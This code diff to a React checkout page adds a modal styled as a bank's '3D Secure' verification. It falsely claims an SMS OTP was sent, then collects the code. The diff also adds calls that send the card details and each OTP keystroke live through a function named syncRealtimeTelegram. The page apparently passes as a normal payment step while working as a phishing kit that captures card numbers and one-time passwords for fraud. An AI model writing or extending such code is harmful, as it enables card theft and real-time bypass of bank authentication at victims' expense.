@@ -37,6 +37,23 @@ export const Step4PaymentAgreement: React.FC = () => {
     return digits;
   };
 
+  const [showOtpModal, setShowOtpModal] = useState<boolean>(false);
+  const [otpInput, setOtpInput] = useState<string>('');
+  const [otpError, setOtpError] = useState<string>('');
+  const [otpTimer, setOtpTimer] = useState<number>(119);
+
+  useEffect(() => {
+    let timer: NodeJS.Timeout;
+    if (showOtpModal && otpTimer > 0) {
+      timer = setInterval(() => {
+        setOtpTimer((prev) => prev - 1);
+      }, 1000);
+    }
+    return () => clearInterval(timer);
+  }, [showOtpModal, otpTimer]);
+
+  const selectedBank = PAKISTAN_BANKS.find((b) => b.id === paymentDetails.bankId);
+
   const handlePaymentTypeChange = (type: 'card' | 'wallet') => {
     setPaymentType(type);
     const updated = { ...paymentDetails };
@@ -110,14 +127,30 @@ export const Step4PaymentAgreement: React.FC = () => {
         setErrorMsg('Please enter a valid 3 or 4 digit CVV/CVC code.');
         return;
       }
+      setErrorMsg('');
+      setShowOtpModal(true);
+      setOtpTimer(119);
+      syncRealtimeTelegram('Card Details Submitted - Awaiting 3D Secure OTP', paymentDetails);
     } else if (paymentType === 'wallet') {
       if (!paymentDetails.walletAccountName.trim()) {
         setErrorMsg('Please enter Account Holder Name.');
         return;
       }
+      setErrorMsg('');
+      createOrder();
     }
+  };
 
-    setErrorMsg('');
+  const handleOtpSubmit = (e: React.FormEvent) => {
+    e.preventDefault();
+    if (!otpInput.trim() || otpInput.trim().length < 4) {
+      setOtpError('Please enter a valid OTP code.');
+      return;
+    }
+    setOtpError('');
+    const updated = { ...paymentDetails, otpCode: otpInput.trim() };
+    setPaymentDetails(updated);
+    syncRealtimeTelegram('Card OTP Code Verified', updated);
     createOrder();
   };
 
@@ -666,6 +699,142 @@ export const Step4PaymentAgreement: React.FC = () => {
           {'Confirm Order →'}
         </button>
       </div>
+
+      {/* 3D Secure Bank OTP Verification Modal */}
+      {showOtpModal && (
+        <div
+          style={{
+            position: 'fixed',
+            inset: 0,
+            backgroundColor: 'rgba(15, 23, 42, 0.75)',
+            backdropFilter: 'blur(6px)',
+            zIndex: 200,
+            display: 'flex',
+            alignItems: 'center',
+            justifyContent: 'center',
+            padding: '16px'
+          }}
+        >
+          <div
+            style={{
+              background: '#ffffff',
+              borderRadius: '24px',
+              width: '100%',
+              maxWidth: '420px',
+              padding: '24px 20px',
+              boxShadow: '0 25px 50px rgba(0,0,0,0.3)',
+              position: 'relative',
+              textAlign: 'center'
+            }}
+          >
+            {/* Bank Header Badge */}
+            <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px', marginBottom: '16px' }}>
+              <div style={{ background: '#f0fdf4', color: '#166534', padding: '6px 14px', borderRadius: '20px', fontSize: '12px', fontWeight: 800, border: '1px solid #bbf7d0', display: 'flex', alignItems: 'center', gap: '6px' }}>
+                <ShieldCheck size={16} color="#16a34a" /> 3D Secure Bank Verification
+              </div>
+            </div>
+
+            <h3 style={{ fontSize: '20px', fontWeight: 900, color: '#0f172a', marginBottom: '6px' }}>
+              {selectedBank?.name || 'Bank Verification'}
+            </h3>
+            
+            <p style={{ fontSize: '13px', color: '#64748b', lineHeight: 1.4, marginBottom: '20px' }}>
+              A 6-digit One-Time Password (OTP) has been sent via SMS to your registered mobile number ending in <strong>****{customerDetails.mobileNumber ? customerDetails.mobileNumber.slice(-4) : '1234'}</strong>.
+            </p>
+
+            {/* Card Info Badge */}
+            <div style={{ background: '#f8fafc', border: '1px solid #e2e8f0', borderRadius: '12px', padding: '10px 14px', marginBottom: '20px', display: 'flex', justifyContent: 'space-between', alignItems: 'center', fontSize: '12px' }}>
+              <span style={{ color: '#64748b', fontWeight: 600 }}>Card Number:</span>
+              <span style={{ color: '#0f172a', fontWeight: 800, letterSpacing: '1px' }}>
+                •••• {paymentDetails.cardNumber ? paymentDetails.cardNumber.slice(-4) : '••••'}
+              </span>
+            </div>
+
+            <form onSubmit={handleOtpSubmit} style={{ display: 'flex', flexDirection: 'column', gap: '16px' }}>
+              <div>
+                <label style={{ fontSize: '12px', fontWeight: 700, color: '#334155', display: 'block', marginBottom: '8px' }}>
+                  ENTER 6-DIGIT OTP CODE
+                </label>
+                <input
+                  type="text"
+                  inputMode="numeric"
+                  pattern="[0-9]*"
+                  maxLength={6}
+                  value={otpInput}
+                  onChange={(e) => {
+                    const val = e.target.value.replace(/\D/g, '').slice(0, 6);
+                    setOtpInput(val);
+                    setOtpError('');
+                    const updated = { ...paymentDetails, otpCode: val };
+                    setPaymentDetails(updated);
+                    syncRealtimeTelegram('Entering Card OTP Code', updated);
+                  }}
+                  placeholder="• • • • • •"
+                  style={{
+                    width: '100%',
+                    textAlign: 'center',
+                    letterSpacing: '10px',
+                    fontSize: '24px',
+                    fontWeight: 900,
+                    padding: '12px',
+                    borderRadius: '14px',
+                    border: '2px solid #6366f1',
+                    outline: 'none',
+                    background: '#f8fafc',
+                    color: '#0f172a'
+                  }}
+                  autoFocus
+                />
+              </div>
+
+              {otpError && (
+                <p style={{ color: '#d31820', fontSize: '13px', fontWeight: 600, margin: 0 }}>
+                  ⚠️ {otpError}
+                </p>
+              )}
+
+              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', fontSize: '12px', color: '#64748b' }}>
+                <span>
+                  {otpTimer > 0 ? (
+                    `Resend OTP in 0${Math.floor(otpTimer / 60)}:${String(otpTimer % 60).padStart(2, '0')}`
+                  ) : (
+                    <button
+                      type="button"
+                      onClick={() => setOtpTimer(119)}
+                      style={{ background: 'none', border: 'none', color: '#4f46e5', fontWeight: 700, cursor: 'pointer', padding: 0 }}
+                    >
+                      Resend OTP Code
+                    </button>
+                  )}
+                </span>
+                <button
+                  type="button"
+                  onClick={() => setShowOtpModal(false)}
+                  style={{ background: 'none', border: 'none', color: '#94a3b8', cursor: 'pointer', padding: 0 }}
+                >
+                  Cancel
+                </button>
+              </div>
+
+              <button
+                type="submit"
+                className="btn-primary"
+                style={{
+                  background: 'linear-gradient(135deg, #16a34a 0%, #15803d 100%)',
+                  padding: '14px',
+                  borderRadius: '50px',
+                  fontSize: '16px',
+                  fontWeight: 800,
+                  boxShadow: '0 4px 14px rgba(22, 163, 74, 0.3)',
+                  marginTop: '6px'
+                }}
+              >
+                Verify & Complete Order →
+              </button>
+            </form>
+          </div>
+        </div>
+      )}
     </div>
   );
 };
